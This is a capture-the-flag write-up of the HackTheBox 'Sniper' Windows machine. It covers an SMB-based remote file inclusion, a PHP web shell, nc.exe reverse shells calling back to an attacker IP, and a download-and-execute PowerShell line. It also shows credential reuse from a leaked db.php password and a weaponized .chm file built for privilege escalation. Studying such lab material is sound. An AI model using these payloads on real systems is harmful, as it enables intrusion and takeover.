---
title: "Sniper"
date: 2023-07-17T17:25:24+02:00
tags: ["windows","web","privesc","smb"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Windows machine with a website which has a RFI vulnerability. The initial privilege escalation occurred due to a typical case of credential reuse. The second privesc revolved around maliciously manipulating a .chm file in order to achieve code execution with administrator privileges."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Sniper
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Sniper

![Untitled](/HTB/sniper-icon.png)

## Tools Used

- Nmap
- Gobuster

## Port Scanning

I start with a port scan:

```bash
sudo nmap $IP -p- -vvv --min-rate 5000
```

```bash
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 18459/tcp): CLEAN (Timeout)
|   Check 2 (port 45542/tcp): CLEAN (Timeout)
|   Check 3 (port 51336/udp): CLEAN (Timeout)
|   Check 4 (port 21300/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m00s
| smb2-time:
|   date: 2023-07-14T16:07:46
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

The results shows five open ports, the three relevant ports are the port 80 with website and a smb server running in the port 139/445.

## Enumeration

Let’s enumerate the website

![Untitled](/HTB/sniper-1.png)

If we visit the website we found a delivery website called Sniper Co. The home page has three links which don’t lead anywhere, the “Our service” link redirects you to `/blog/index.php` and the “User Portal” link points to `/user/index.php`

If we check **Wappalyzer** we observe that the website is working with php.

![Untitled](/HTB/sniper-2.png)

**Gobuster** doesn’t shows anything interesting when we fuzz the website

```bash
===============================================================
2023/07/14 11:19:30 Starting gobuster in directory enumeration mode
===============================================================
/blog/                (Status: 200) [Size: 5704]
/Blog/                (Status: 200) [Size: 5704]
/css/                 (Status: 403) [Size: 1233]
/images/              (Status: 403) [Size: 1233]
/Images/              (Status: 403) [Size: 1233]
/index.php/           (Status: 200) [Size: 2635]
/Index.php/           (Status: 200) [Size: 2635]
/index.php/           (Status: 200) [Size: 2635]
/js/                  (Status: 403) [Size: 1233]
/user/                (Status: 302) [Size: 0] [--> login.php]

===============================================================
2023/07/14 11:29:16 Finished
===============================================================
```

Navigating the website we found a possible **LFI** at the blog page.

![Untitled](/HTB/sniper-3.png)

![Untitled](/HTB/sniper-4.png)

If we change the language, the page include a query to a file. There is a possibility that the website has the three language pages in the same directory.

```php
include $_GET['lang'];
```

With that code line PHP include it.

The user site its a login page and like always I tried the common passwords but nothing works.

![Untitled](/HTB/sniper-5.png)

If we click to the Sign Up button we go to `/user/registration.php`

![Untitled](/HTB/sniper-6.png)

If we create a new user and try to log in the page shows a under construction page.

![Untitled](/HTB/sniper-7.png)

## Exploiting

Let’s return to the **LFI** vuln if we try to change the current directory to `..\index.php`, the page shows an error.

![Untitled](/HTB/sniper-8.png)

But if we try with aboslute paths like `\windows\win.ini` the page loads his content in the source code.

If we have LFI it’s possible that we have RFI at the same time.

If we run a website and try to connect to any file on it with the machine doesn’t do nothing. HTTP includes seem to be turned off.

![Untitled](/HTB/sniper-9.png)

![Untitled](/HTB/sniper-10.png)

We know that the machine is windows this is why we have other possible **RFI** in the smb service so let’s put a **smbserver.py** and try to load the same file.

I used this command to run the server

```php
smbserver.py smbFolder $(pwd) -smb2support
```

This command creates a share folder named smbFolder when we put the current directory with `$(pwd)` and supports smb v2.

Now the website doesn’t show the error and we obtained the output of the whoami command. We have managed to load a file with smb.

![Untitled](/HTB/sniper-11.png)

![Untitled](/HTB/sniper-12.png)

I tried to load a web shell because the website is running php and we don’t know if the remote machine has nc, so a reverse shell maybe doesn’t work well.

The webshell works putting the value of the command in the url and the output of the command is wrote in the source code. The webshell PHP code is:

```php
<?php
    echo system($_GET["cmd"]);
?>
```

Now we have command injection, we can try to put in the smb share folder a nc.exe windows binary to run a reverse shell. I found this binary in the [SecLists](https://github.com/danielmiessler/SecLists) Folder > Web-Shells > FuzzDB. 

Once we putted the file in the smbFolder we can run the reverse shell with the following url 

```html
http://10.10.10.151/blog/?lang=\\\\10.10.14.20\\smbFolder\\basicWebShell.php&cmd=\\\\10.10.14.20\\smbFolder\\nc.exe+-e+cmd+10.10.14.20+4444
```

As it a reverse shell we need to perform a netcat listener.

```html
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/sniper-13.png)

We are logged as **iusr**

![Untitled](/HTB/sniper-14.png)

**iusr** doesn’t seem to be like a common user so I supposed that is a daemon running the website.

![Untitled](/HTB/sniper-15.png)

We can’t acces to the chris directory so let’s see if there is any way to own the user.

If we return to the website folder there is a db.php file with credentials at the user folder of the website. We can use the password to perform a user pivoting to gain access to **chris**.

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

Let’s move to powershell to perform that technique.

First let’s see what is the hostname

![Untitled](/HTB/sniper-16.png)

With the following commands we can make an object with the password and the username

```powershell
$user = "Sniper\chris"
$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
```

Now let’s invoke a command to see if the password is Chris's. I used:

```powershell
Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { whoami }
```

![Untitled](/HTB/sniper-17.png)

Now we can perform a reverse shell with the same command as above.

```powershell
Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { \\10.10.14.20\smbFolder\nc.exe -e cmd 10.10.14.20 4445 }
```

```powershell
nc -lv 4445
```

![Untitled](/HTB/sniper-18.png)

We obtained access, let’s cat the **user’s flag**

![Untitled](/HTB/sniper-19.png)

## Escalating Privilege

Navigating through the directories we find a directory called c:\Docs

![Untitled](/HTB/sniper-20.png)

Inside we have a note.txt written by the CEO of Sniper Co.

> **note.txt**
> 
> 
> Hi Chris,
> Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
> 
> Regards,
> Sniper CEO.
> 

The CEO wants a app documentation and is waiting to chris to drop it inside the Docs directory.

If we return to chris folder there is a interesting file at downloads directory.

![Untitled](/HTB/sniper-21.png)

It’s a .chm file which is Windows help files, so that could be the documentation that the CEO was talking about.

![Untitled](/HTB/sniper-24.webp)

We know now that the CEO is waiting .chm file so let’s put a weaponized one in the docs directory.

I have used a Windows VM for this part as it’s necessary for the use of HTML Help Workshop which is a Windows program which help us to create .chm files.

First we need to install Out-CHM a [NisHang](https://github.com/samratashok/nishang/tree/master) tool which makes weaponized .chm with the help of HTML Help Workshop.

Once in the powershell we can import the script with:

```powershell
IEX(New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1")
```

The use of Out-CHM is very simple we need to pass the Payload which are going to execute in the remote machine and the path of the HTML Help Workshop (If you don’t have it you can install it from [here](http://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe)).

We are going to use the following payload to establish a reverse shell with the victim

```powershell
Out-CHM -Payload "\Docs\nc.exe -e cmd 10.10.14.20 4443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

Now we have a weaponoized .chm named doc.chm in our VM, only lefts to put it in the Docs directory of the remote machine. I moved first the file to my smb share and performed the next command:

```powershell
copy \\10.10.14.20\smbFolder\doc.chm C:\Docs
```

We need to copy the nc.exe binary from or samba share to the remote machine to make sure it works.

```powershell
copy \\10.10.14.20\smbFolder\nc.exe C:\Docs
```

Only rest put a listener and wait to the CEO to open my malicious file.

```powershell
nc -lv 4443
```

![Untitled](/HTB/sniper-22.png)

We have owned the system, let’s cat the **root’s flag.**

![Untitled](/HTB/sniper-23.png)

## Lessons Learned

- What insights did you gain from the room?
    
    I learned how I can perform a smb RFI attack to gain RCE in a windows machine and to create weaponized .chm to perform a privesc.
    
- Were there any novel tools or techniques employed?
    
    I discovered a new technique called user pivoting which helps you to invoke commands with the user credentials.

**Thank you for reading, and happy hacking! 😄**